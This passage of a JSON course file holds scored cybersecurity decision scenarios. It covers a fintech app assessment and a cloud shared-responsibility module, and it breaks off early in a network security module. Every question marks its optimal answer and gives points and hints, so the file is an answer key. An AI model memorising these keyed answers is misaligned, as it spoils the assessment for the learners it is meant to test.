            "text": "Stripe and Plaid - they handle the most sensitive financial data",
            "feedback": "{'short': 'Major vendors have mature security programs', 'detailed': \"Stripe and Plaid are PCI-compliant, SOC 2 certified financial infrastructure providers. They're likely MORE secure than what VaultPay could build in-house. The risk isn't these vendors' security - it's HOW VaultPay integrates with them (API key management, webhook verification). Major fintech vendors are usually the lowest third-party risk.\", 'consequence': \"Time spent reviewing Stripe and Plaid's security certifications. They're fine. Meanwhile, vulnerable npm packages remain unexamined.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Twilio for SMS - SMS is vulnerable to SIM swapping attacks",
            "feedback": "{'short': 'Real risk but not the most significant', 'detailed': \"SMS OTP vulnerabilities are real (SIM swap, SS7 attacks), but this is a known risk with known mitigations (push-based MFA, authenticator apps). It's a concern for authentication design, not a critical third-party vendor risk. The bigger third-party risk is in the software supply chain.\", 'consequence': 'SMS OTP risk documented. Recommendation to offer authenticator app option added. Supply chain vulnerabilities unaddressed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "NPM packages and Docker images - unvetted code in the software supply chain",
            "feedback": "{'short': 'Correct! Supply chain is the highest third-party risk', 'detailed': '47 npm packages with known vulnerabilities (including Log4j), no SBOM, unpinned versions, no scanning in CI/CD - this is significant supply chain risk. Unlike vetted fintech partners, open source dependencies vary wildly in security posture. Malicious or vulnerable packages can compromise the entire application. Supply chain security is often the overlooked third-party risk.', 'consequence': 'Supply chain risk prioritized. Vulnerability scanning added to CI/CD. Dependencies pinned and reviewed. Log4j and other critical CVEs addressed.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "AWS - reliance on a single cloud provider creates concentration risk",
            "feedback": "{'short': 'Availability concern, not security risk', 'detailed': \"Single cloud provider is an availability and vendor lock-in consideration, not primarily a security risk. AWS has a strong security posture with shared responsibility model. The security risks in VaultPay's AWS usage are configuration issues (their responsibility), not AWS itself.\", 'consequence': 'Multi-cloud strategy discussions initiated. First-party AWS misconfigurations remain unaddressed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Which third-party components have the least vetting and the most direct access to your application code?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Open source dependencies (npm packages, container images) run with full application privileges but may have vulnerabilities or even malicious code. This supply chain risk is often overlooked."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Authentication Security",
        "situation": "Review of authentication mechanisms reveals significant weaknesses: no MFA on merchant dashboard, SMS-only OTP on consumer app, non-expiring JWT tokens, and weak password policies. The product team pushes back: 'MFA creates friction that hurts user conversion.'\n\n**Question:** What authentication improvement should be the TOP priority for a payment platform?",
        "options": [
          {
            "id": "A",
            "text": "Implement MFA on the admin portal first - highest privilege users",
            "feedback": "{'short': 'Admin portal already has IP whitelist control', 'detailed': \"Admin portal has IP whitelisting as a compensating control. While MFA would be better, the merchant dashboard has NO additional controls AND provides access to financial operations. Merchants can process refunds, view settlements, and manage API keys with just a weak password. That's the higher risk.\", 'consequence': 'Admin MFA implemented. Merchant accounts still protected only by weak passwords. Merchant account compromise leads to fraudulent refunds.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Require MFA on merchant dashboard - financial access with weak authentication is critical",
            "feedback": "{'short': 'Correct! Merchant dashboard has financial access with minimal protection', 'detailed': 'Merchant dashboard allows: viewing all transaction data, processing refunds, managing API keys, and accessing settlement reports. Currently protected only by 6-character passwords with no MFA. A single compromised merchant could lead to mass fraud. For payment platforms, financial access points require strong authentication. User friction is acceptable for financial operations.', 'consequence': 'Merchant MFA implemented. Financial operations protected by TOTP. Account takeover risk dramatically reduced.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Fix JWT token expiration first - non-expiring tokens are the root cause of many issues",
            "feedback": "{'short': 'Important but MFA provides more immediate protection', 'detailed': 'JWT expiration is important for limiting the window of a stolen token. However, if credentials are easily compromised (weak passwords, no MFA), attackers can simply get new tokens. MFA prevents credential compromise at the authentication point - fixing the root cause rather than limiting damage duration.', 'consequence': 'JWT expiration set to 1 hour. Attackers still compromise merchant accounts easily with weak passwords, request new tokens hourly.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Upgrade SMS OTP to authenticator apps - SMS is vulnerable to SIM swap",
            "feedback": "{'short': 'Good improvement but consumers already have some MFA', 'detailed': 'Upgrading from SMS to authenticator is a valid improvement, but consumers already have SOME MFA (even if weak). Merchants have NO MFA at all for financial access. Adding MFA where none exists is more impactful than upgrading existing MFA. Address the zero-MFA problem first.', 'consequence': 'Consumer app upgraded to authenticator. Merchants still have no MFA. Merchant account compromise remains trivial.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Which user type has financial access (refunds, settlements) with the weakest authentication?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Merchants can process refunds with only a 6-character password, no MFA. This is financial access with minimal protection."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Data Security Priorities",
        "situation": "Data security review reveals multiple issues: PII in logs, MD5 password hashing for merchants, unencrypted ElastiCache, and SSN storage. The compliance officer wants to focus on PCI-DSS scope; the privacy officer wants to focus on PII protection.\n\n**Question:** What data security issue poses the GREATEST immediate risk?",
        "options": [
          {
            "id": "A",
            "text": "PII in CloudWatch logs - violates privacy principles and creates exposure",
            "feedback": "{'short': 'Significant issue but requires AWS access to exploit', 'detailed': 'PII in logs is a real compliance and security issue, but exploitation requires access to CloudWatch or the S3 log archives - this is an internal exposure. MD5 password hashing combined with database exposure (SQLi was found) means passwords can be cracked EXTERNALLY. Internal data exposure is lower priority than external.', 'consequence': 'Log sanitization implemented. MD5-hashed passwords extracted via SQLi and cracked within hours. Mass account takeover.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "MD5 password hashing for merchants - trivially crackable if database is compromised",
            "feedback": "{'short': 'Correct! MD5 + SQLi = mass credential exposure', 'detailed': 'MD5 is cryptographically broken for password storage. Combined with the SQL injection vulnerability, an attacker can extract the merchant password table and crack most passwords within hours using rainbow tables or GPU cracking. This enables mass merchant account takeover. Fix MD5 immediately, especially given the database exposure risk.', 'consequence': 'Merchant passwords migrated to bcrypt with forced password reset. Even if SQLi exploited before fix, passwords are properly protected going forward.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Unencrypted ElastiCache - cache data exposed without encryption at rest",
            "feedback": "{'short': 'Good hygiene but requires internal access to exploit', 'detailed': \"ElastiCache encryption at rest protects against physical media theft or snapshot exposure - relatively rare attack scenarios. The cache is in a private subnet requiring network access first. While encryption should be enabled, it's lower priority than externally-exploitable password storage issues.\", 'consequence': 'ElastiCache encryption enabled. MD5 passwords still crackable from database dump.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "SSN storage - highest sensitivity PII with regulatory implications",
            "feedback": "{'short': 'Sensitive but encrypted and in limited scope', 'detailed': 'SSN storage is high-sensitivity and should be minimized, but the SSNs are in encrypted RDS (AES-256) and limited to high-value accounts. The immediate risk is MD5-hashed passwords that can be cracked instantly if extracted. Fix the active vulnerability before optimizing sensitive data handling.', 'consequence': 'SSN storage review initiated. Meanwhile, MD5 passwords cracked from database dump.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Consider which data security issues can be exploited in combination with other vulnerabilities you've found."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "SQL injection can extract the password table. MD5 hashes can be cracked almost instantly with rainbow tables. The combination is catastrophic."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Infrastructure Hardening",
        "situation": "AWS security review reveals multiple issues: default security groups allowing broad internal access, containers running as root, no VPC flow logs, and missing GuardDuty. With limited time before launch, you need to prioritize infrastructure hardening.\n\n**Question:** What infrastructure security improvement provides the BEST risk reduction for the time investment?",
        "options": [
          {
            "id": "A",
            "text": "Implement strict network segmentation with security groups and NACLs",
            "feedback": "{'short': 'High impact but significant implementation time', 'detailed': 'Network segmentation is important for defense-in-depth, but proper implementation requires understanding all legitimate traffic flows, implementing gradually, and testing thoroughly. This is a multi-week effort. For pre-launch, focus on higher-impact quick wins that can be implemented in days.', 'consequence': 'Network segmentation project started. Takes 4 weeks to implement properly. Other quick wins delayed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Deploy AWS WAF with OWASP managed rules on API Gateway",
            "feedback": "{'short': 'Correct! WAF provides broad protection with quick deployment', 'detailed': 'AWS WAF with OWASP managed rules can be deployed in hours and provides immediate protection against common web attacks (SQLi, XSS, known attack patterns) at the perimeter. While not a substitute for fixing code vulnerabilities, it provides defense-in-depth and catches attack attempts. High value for low implementation time.', 'consequence': 'WAF deployed in 2 days. Immediately blocking known attack patterns. Provides protection while code fixes are implemented.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Enable GuardDuty and Security Hub for threat detection",
            "feedback": "{'short': \"Valuable for detection but doesn't prevent attacks\", 'detailed': \"GuardDuty and Security Hub improve visibility and detection but don't prevent attacks. For pre-launch when you're fixing critical vulnerabilities, preventive controls (WAF) provide more immediate value than detective controls. Enable detection, but prioritize prevention for launch readiness.\", 'consequence': 'GuardDuty detecting reconnaissance. No prevention of actual attacks. SQLi still exploitable.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Fix container security - stop running as root, add resource limits",
            "feedback": "{'short': 'Good hardening but reduces impact, not likelihood', 'detailed': \"Container hardening (non-root, resource limits) limits blast radius if containers are compromised, but doesn't prevent the compromise. With SQLi and IDOR vulnerabilities present, attackers can compromise the application regardless of container configuration. Fix the external vulnerabilities first, then harden containers.\", 'consequence': 'Containers hardened. Application still compromised via SQLi. Better container security limits lateral movement slightly.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What control can be deployed quickly and provides broad protection against common web attacks?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "AWS WAF with managed rules (OWASP) deploys in hours and blocks common attack patterns at the perimeter - quick win with high value."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Input Validation Strategy",
        "situation": "Multiple input validation issues were found across APIs. The development team asks whether they should implement validation at the API Gateway level, in the application code, or both. They're concerned about maintenance overhead of duplicate validation.\n\n**Question:** What is the correct approach to input validation for a payment platform?",
        "options": [
          {
            "id": "A",
            "text": "API Gateway validation only - single point of enforcement is easier to maintain",
            "feedback": "{'short': 'Single layer validation is insufficient', 'detailed': \"API Gateway can validate request structure (schema validation) but can't understand business logic. It can check 'amount is a number' but not 'amount doesn't exceed user's balance.' Application-layer validation is essential for business rules. Single-layer validation also fails to defense in depth principle.\", 'consequence': \"Gateway validates format. Application doesn't validate business logic. Negative amounts, excessive refunds, and business logic bypasses successful.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Application code validation only - that's where business logic lives",
            "feedback": "{'short': 'Misses the perimeter defense opportunity', 'detailed': \"Application validation is essential but shouldn't be the only layer. Gateway-level validation can reject obviously malicious requests before they reach your application, reducing attack surface and load. Defense in depth means validation at multiple layers with different purposes.\", 'consequence': 'Application validates thoroughly but malformed requests still reach backend, consuming resources and potentially finding parser vulnerabilities.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Defense in depth - schema validation at Gateway, business logic validation in application",
            "feedback": "{'short': 'Correct! Multiple layers with appropriate validation at each', 'detailed': 'Proper input validation uses multiple layers: API Gateway enforces schema (data types, required fields, basic format), application code enforces business logic (authorization, business rules, semantic validation), and database uses parameterized queries (preventing injection). Each layer has a specific role. Maintenance overhead is acceptable for security-critical applications.', 'consequence': 'Gateway rejects malformed requests. Application validates business logic. Database prevents injection. Defense in depth achieved.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Rely primarily on WAF rules - they're designed to catch malicious input",
            "feedback": "{'short': \"WAF complements but doesn't replace validation\", 'detailed': 'WAF catches known attack patterns but can be bypassed with encoding, obfuscation, or novel attacks. WAF is defense in depth, not a substitute for proper input validation. Your code must validate input regardless of what perimeter controls exist.', 'consequence': 'WAF catches some attacks. Business logic validation absent. Novel attacks and logic flaws bypass WAF successfully.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What can each layer (Gateway, Application, Database) validate that other layers can't?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Gateway: schema/format. Application: business logic. Database: parameterized queries. Each layer has unique validation capabilities."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Launch Readiness Decision",
        "situation": "It's now 4 weeks to launch. Critical vulnerabilities (SQLi, IDOR) have been fixed. MFA is implemented for merchants. WAF is deployed. But network segmentation, complete container hardening, and PCI-DSS certification are incomplete. The CEO wants to know: can we launch?\n\n**Question:** What is the appropriate launch readiness recommendation?",
        "options": [
          {
            "id": "A",
            "text": "Ready for full public launch - critical vulnerabilities are fixed",
            "feedback": "{'short': 'Some important controls are still missing', 'detailed': \"While critical vulnerabilities are fixed, important controls are incomplete: network segmentation isn't finished, detection capabilities are limited, and incident response procedures don't exist. A full public launch at scale could overwhelm your ability to respond if issues arise. Controlled launch is more appropriate.\", 'consequence': 'Full public launch. Minor vulnerability discovered in week 2. No incident response capability. Scrambled response damages reputation.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Not ready for any launch - complete all security improvements first",
            "feedback": "{'short': 'Overly conservative - business needs matter too', 'detailed': \"Security doesn't exist in a vacuum. Critical vulnerabilities are fixed, important controls are in place, and continued delay has business cost. A controlled launch with limited users allows you to operate, learn, and continue improving. Demanding perfection before any launch isn't realistic or necessary.\", 'consequence': 'Launch delayed indefinitely. Competitors gain market share. Eventually launch anyway under pressure with less security testing than planned.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Ready for limited/controlled launch with documented risk acceptance for remaining gaps",
            "feedback": "{'short': 'Correct! Controlled launch with risk management', 'detailed': \"Critical vulnerabilities fixed, authentication strengthened, WAF deployed - the most exploitable issues are addressed. Remaining gaps (segmentation, detection) are important but don't block a controlled launch. Document remaining risks, get executive acceptance, launch with limited users, and continue security improvements. This balances security with business needs.\", 'consequence': 'Controlled launch with 1,000 users. Security improvements continue. Issues discovered early with limited impact. Full launch after Phase 3 complete.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Ready once PCI-DSS certification is complete - can't process payments without it",
            "feedback": "{'short': 'PCI scope is limited due to tokenization', 'detailed': \"VaultPay uses Stripe tokenization - they never see full card numbers, which significantly limits PCI scope. SAQ-A (minimal scope) likely applies. Full PCI-DSS certification isn't required before launch when properly using tokenization. The security improvements already made are more important than the certification paperwork.\", 'consequence': 'Launch delayed for PCI certification. Certification completed but based on current (improved) security posture anyway. Time wasted.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Consider what risks remain after critical fixes, and whether a controlled launch mitigates those risks."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "A limited/controlled launch reduces risk exposure while allowing business progress. Document remaining gaps, get risk acceptance, and continue improvements."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Ongoing Security Program",
        "situation": "With launch approaching, you need to establish an ongoing security program. The CEO asks what's most important for maintaining security after launch. 'We can't do another full assessment every month.'\n\n**Question:** What is the MOST important ongoing security activity for a payment platform?",
        "options": [
          {
            "id": "A",
            "text": "Annual penetration testing by third-party firm",
            "feedback": "{'short': 'Important but not frequent enough for fast-moving development', 'detailed': 'Annual penetration testing provides valuable external validation but happens too infrequently for a startup shipping code weekly. By the time the pentest happens, dozens of new features have shipped. Continuous security practices integrated into development are more impactful than annual point-in-time assessments.', 'consequence': 'Annual pentest scheduled. 52 weeks of development happen between tests. Vulnerabilities introduced and exploited before next pentest.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Continuous vulnerability scanning integrated into CI/CD pipeline",
            "feedback": "{'short': 'Correct! Continuous security in development pipeline', 'detailed': 'For a fast-moving development team, security must be integrated into the development process. Automated scanning (SAST, DAST, dependency scanning) in CI/CD catches issues before deployment. Every code change is checked. This provides continuous security assurance that matches development velocity. Complement with periodic pentests for deep analysis.', 'consequence': 'Every deployment scanned. Vulnerabilities caught before production. Security scales with development velocity.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Comprehensive security awareness training for all employees",
            "feedback": "{'short': \"Important but doesn't catch code vulnerabilities\", 'detailed': \"Security awareness training helps with phishing and social engineering but doesn't catch SQLi or IDOR in code. For a payment platform, code-level security is the primary concern. Training is part of a complete program but not the most important element for ongoing technical security.\", 'consequence': \"Employees trained. Development continues introducing code vulnerabilities. Training doesn't help with application security.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Bug bounty program to crowdsource vulnerability discovery",
            "feedback": "{'short': 'Valuable but reactive, not proactive', 'detailed': \"Bug bounties leverage external researchers for vulnerability discovery - valuable for finding issues your team missed. However, it's reactive - researchers find issues in production code. CI/CD scanning is proactive - catching issues before deployment. Bug bounties complement but don't replace proactive security testing.\", 'consequence': 'Bug bounty launched. Researchers find issues in production. Better than not finding them, but vulnerabilities reached production first.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What security approach can keep up with weekly code deployments?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "CI/CD integrated security scanning runs with every deployment. This scales with development velocity and catches issues before production."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D3-REM-001",
    "title": "Cloud Fundamentals Remediation",
    "domain": 3,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": "20-30 minutes",
    "role": "Junior Security Analyst",
    "organization": {
      "name": "Greenfield Startup",
      "industry": "Technology"
    },
    "introduction": "Greenfield is a cloud-first startup building their entire infrastructure in the cloud. As a junior analyst, you're helping the team understand cloud security fundamentals. Your CTO wants to ensure everyone understands the security implications of different cloud choices.",
    "learning_objectives": [
      "Compare and contrast security implications of different architecture models"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Service Model Understanding",
        "situation": "Greenfield is deploying a web application. The development team asks whether to use virtual machines (IaaS) or a managed app service (PaaS). They want to understand the security implications.\n\n**Question:** In a PaaS deployment, who is responsible for operating system patching?",
        "options": [
          {
            "id": "A",
            "text": "The customer is always responsible for all patching",
            "feedback": "{'short': 'Incorrect - this describes IaaS', 'detailed': 'In PaaS, the provider manages the operating system and runtime environment. The provider handles OS patching. The customer is responsible for application code and data. This is a key benefit of PaaS - reduced operational burden.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "The cloud provider handles OS patching in PaaS",
            "feedback": "{'short': 'Correct! Provider manages OS in PaaS', 'detailed': 'In PaaS, the provider manages everything up through the runtime: physical infrastructure, virtualization, OS, and middleware/runtime. The customer manages their application code and data. This is why PaaS reduces operational overhead - no OS patching required.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Neither - patching is automatic in all cloud models",
            "feedback": "{'short': 'Incorrect - depends on service model', 'detailed': \"Patching responsibility varies by service model. In IaaS, the customer patches the OS. In PaaS, the provider patches. In SaaS, the provider manages everything. It's not automatic for the customer in IaaS.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Patching is shared equally between customer and provider",
            "feedback": "{'short': 'Incorrect - responsibilities are divided, not shared', 'detailed': \"Shared responsibility doesn't mean sharing each task. It means different tasks are assigned to different parties. OS patching in PaaS is solely the provider's responsibility. The customer focuses on application-level concerns.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Shared Responsibility Application",
        "situation": "A data breach occurs at a company using AWS EC2 instances. Investigation reveals the instances were running unpatched operating systems. The company tries to blame AWS for the breach.\n\n**Question:** In this IaaS scenario, who is responsible for the unpatched OS vulnerability?",
        "options": [
          {
            "id": "A",
            "text": "AWS - they should have patched the instances automatically",
            "feedback": "{'short': 'Incorrect - IaaS customers own OS management', 'detailed': 'In IaaS, the provider gives you a virtual machine - what you do with it is your responsibility. AWS provides the infrastructure; the customer manages the OS, applications, and data. OS patching is 100% customer responsibility in IaaS.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "The customer - they own OS patching responsibility in IaaS",
            "feedback": "{'short': 'Correct! Customer manages OS in IaaS', 'detailed': \"In IaaS (EC2, Azure VMs), the customer is responsible for everything from the operating system up: OS patching, hardening, application security, and data protection. AWS secures the hypervisor and physical infrastructure, but guest OS management is the customer's job.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Shared - both parties should have caught this",
            "feedback": "{'short': 'Incorrect - OS is clearly customer responsibility', 'detailed': \"While 'shared responsibility' is the model name, specific tasks have clear ownership. OS patching in IaaS is unambiguously the customer's responsibility. AWS has no access to patch your instances - they don't have credentials to your OS.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Neither - patching is an inherent cloud risk",
            "feedback": "{'short': 'Incorrect - patching responsibilities are clearly defined', 'detailed': \"Patching responsibilities are well-defined in cloud models. It's not an inherent risk - it's a responsibility that needs to be managed. In IaaS, the customer manages OS; in PaaS, the provider manages OS. Clear ownership, not inherent risk.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "SaaS Security Boundaries",
        "situation": "Greenfield uses Microsoft 365 for email and collaboration. An employee's account is compromised via phishing, and confidential data is exfiltrated. The CEO asks who is responsible.\n\n**Question:** In this SaaS scenario, what is the PRIMARY customer security responsibility?",
        "options": [
          {
            "id": "A",
            "text": "Securing the Microsoft 365 servers",
            "feedback": "{'short': 'Incorrect - provider manages SaaS infrastructure', 'detailed': \"In SaaS, the provider manages all infrastructure, including servers, operating systems, and the application itself. Microsoft secures the M365 infrastructure. Customers don't have access to or responsibility for the servers.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Managing user access and data protection",
            "feedback": "{'short': 'Correct! SaaS customers manage access and data', 'detailed': 'In SaaS, customer responsibilities narrow to: user access management (who has accounts, MFA, conditional access), data classification and protection (what data is stored, who can access it), and configuration (security settings within the application). The phishing attack succeeded due to access control gaps - customer responsibility.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Patching the Microsoft 365 application",
            "feedback": "{'short': 'Incorrect - provider manages SaaS application', 'detailed': 'SaaS applications are managed entirely by the provider. Microsoft patches, updates, and maintains M365. Customers cannot access or modify the application code. Customer responsibility is limited to configuration and data.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Encrypting data in Microsoft 365",
            "feedback": "{'short': 'Partially relevant but not primary responsibility', 'detailed': 'Microsoft provides encryption for M365 data (at rest and in transit). Customers can configure additional protection (sensitivity labels, DLP), but the primary responsibility is access management - controlling who can access the data. The phishing attack was an access control failure.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Cloud Deployment Models",
        "situation": "A healthcare company is moving to the cloud but has HIPAA compliance requirements. They're evaluating public cloud vs. private cloud for storing patient health information.\n\n**Question:** Can HIPAA-regulated data be stored in public cloud like AWS or Azure?",
        "options": [
          {
            "id": "A",
            "text": "No - HIPAA requires private cloud or on-premises only",
            "feedback": "{'short': 'Incorrect - public cloud can be HIPAA compliant', 'detailed': \"HIPAA doesn't prohibit public cloud. AWS, Azure, and GCP all offer HIPAA-eligible services and will sign Business Associate Agreements (BAAs). Many healthcare organizations use public cloud for PHI. The key is proper configuration and BAA, not avoiding public cloud.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Yes - with proper configuration and Business Associate Agreement",
            "feedback": "{'short': 'Correct! Public cloud can be HIPAA compliant with proper controls', 'detailed': 'Major public cloud providers offer HIPAA-compliant services. Requirements: sign a BAA with the provider, use only HIPAA-eligible services, configure services according to HIPAA requirements (encryption, access control, audit logging). Public cloud can actually enhance security with provider expertise and tools.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Only in government cloud regions",
            "feedback": "{'short': 'Incorrect - government cloud is for federal, not HIPAA', 'detailed': 'Government cloud (GovCloud, Azure Government) is for federal government workloads with FedRAMP requirements. HIPAA compliance is available in standard commercial cloud regions. Government cloud is neither required nor particularly beneficial for HIPAA.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Yes - cloud providers automatically handle all HIPAA requirements",
            "feedback": "{'short': 'Incorrect - shared responsibility applies', 'detailed': \"Shared responsibility still applies. The provider offers HIPAA-eligible infrastructure, but the customer must: configure services properly, manage access appropriately, encrypt data, implement audit logging, and manage compliance documentation. It's not automatic.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Responsibility Summary",
        "situation": "Your CTO asks you to create a quick reference showing security responsibilities across cloud models. You need to demonstrate your understanding.\n\n**Question:** Which statement BEST describes the shared responsibility model?",
        "options": [
          {
            "id": "A",
            "text": "Cloud providers are responsible for all security in the cloud",
            "feedback": "{'short': 'Incorrect - customers have significant responsibilities', 'detailed': 'Cloud providers secure the cloud infrastructure, but customers are always responsible for their data, access management, and configuration. Many cloud breaches are due to customer misconfiguration, not provider failures. Security is shared, not delegated.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Provider secures the cloud infrastructure; customer secures what they put in it",
            "feedback": "{'short': 'Correct! Security OF the cloud vs. IN the cloud', 'detailed': \"This is the core concept: Provider handles 'security OF the cloud' (infrastructure, physical, hypervisor). Customer handles 'security IN the cloud' (data, access, configuration). The specific split varies by service model (more customer responsibility in IaaS, less in SaaS), but this principle always applies.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Customers can delegate all security responsibilities to cloud providers",
            "feedback": "{'short': 'Incorrect - customer responsibilities cannot be delegated', 'detailed': \"Customers ALWAYS retain responsibility for their data and access management. Even in SaaS where the provider manages almost everything technical, the customer must manage user access and data protection. You can't outsource all security.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Security responsibilities are identical across IaaS, PaaS, and SaaS",
            "feedback": "{'short': 'Incorrect - responsibilities shift between models', 'detailed': 'Responsibilities shift significantly: IaaS = customer manages OS, applications, data. PaaS = customer manages applications, data (provider manages OS). SaaS = customer manages data and access (provider manages everything else). Understanding this shift is key to cloud security.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 125,
    "passing_score": 75
  },
  {
    "id": "D3-REM-002",
    "title": "Network Security Basics Remediation",
    "domain": 3,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": "20-30 minutes",
    "role": "IT Security Intern",
    "organization": {
      "name": "Valley Medical Clinic",
      "industry": "Healthcare"
    },
    "introduction": "Valley Medical Clinic is a small healthcare provider with basic network infrastructure. As an IT security intern, you're learning network security fundamentals while helping assess their current setup. The IT manager is teaching you key concepts as you evaluate the network.",
    "learning_objectives": [
      "Given a scenario, apply security principles to secure enterprise infrastructure"
